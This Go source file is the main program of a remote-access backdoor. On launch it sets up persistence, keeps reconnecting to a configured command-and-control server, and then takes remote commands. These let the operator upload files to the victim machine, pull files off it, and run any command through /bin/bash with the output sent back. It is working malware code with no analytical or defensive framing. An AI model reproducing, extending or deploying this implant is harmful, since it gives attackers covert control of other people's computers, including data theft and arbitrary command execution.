package main

import(
  "net"
  "time"
  "strings"
  "io"
  "fmt"
  "os/exec"

  "./debug"
  "./info"
  "./persist"
  "./config"
  "./socket"
)

func main(){
  // get file info
  i, err := info.Init()
  if err != nil {
    debug.Println(err)
    return
  }

  // persistence
  persist.CheckAndExec(i)

  // C2
  handleCMD(connect())
}

func connect()socket.Socket{
  var conn net.Conn
  var err error
  for true {
    conn, err = net.Dial("tcp", config.ServerIP + config.ServerPort)
    if err == nil {
      break
    }
    debug.Println(err)
    time.Sleep(10*time.Second)
  }

  sock := socket.Init(conn, config.Key)
  return sock
}

func handleCMD(sock socket.Socket){
  for {
    cmd, err := sock.Read()
    if err == io.EOF {            // if socket break accidentally (reconnect)
      sock.Close()
      sock = connect()
    }

    switch strings.Split(cmd, " ")[0] {
    case "ping":
      sock.Write("pong")

    case "":
      continue

    case "push":
      cmds := strings.Split(cmd, "push")
      cmds[1] = strings.TrimSpace(cmds[1])
      if err = sock.RecvFile(cmds[1]); err != nil {
        sock.Write(fmt.Sprintf("%v", err))
      } else {
        sock.Write("Finished.")
      }

    case "pull":
      cmds := strings.Split(cmd, "pull")
      cmds[1] = strings.TrimSpace(cmds[1])
      if err = sock.SendFile(cmds[1]); err != nil {
        sock.Write(fmt.Sprintf("%v", err))
      } else {
        sock.Write("Finished.")
      }

    case "shell":
      cmds := strings.Split(cmd, "shell")
      cmds[1] = strings.TrimSpace(cmds[1])
      if cmds[1] == "" {
        sock.Write("Insufficent argument.")
      } else {
        output, err := exec.Command("/bin/bash", "-c", cmds[1]).Output()
        if err != nil {
          debug.Println(err)
          sock.Write(fmt.Sprintf("Error: %v", err))
        } else {
          sock.Write(string(output))
        }
      }

    case "shutdown":
      sock.Close()
      return

    default:
      sock.Write("No such command.")

    }
  }
}
